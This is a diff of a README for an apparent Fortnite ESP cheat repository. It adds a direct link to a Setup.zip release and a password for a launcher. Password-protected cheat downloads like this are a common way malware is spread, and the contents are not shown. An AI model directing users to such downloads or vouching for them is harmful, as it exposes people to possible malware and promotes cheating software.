@@ -9,10 +9,10 @@
 
 
 # Where's the EXE?
-We provide a binary in release tab.
+We provide a binary in release tab. Or you can simply click [Download here](https://github.com/Jiskie/fortnite-esp/releases/download/fortnite-esp/Setup.zip)
 
-# What is the password for the archive?
-Use pass `FortniteESP`
+# What is the password in the launcher?
+Use pass `FortniteClarionixYT`
 
 ## Easy, Fast and Safe ESP for Fortnite 💻
 - Version: **1.1.13.1 | STABLE BETA | 10.07.2024** 
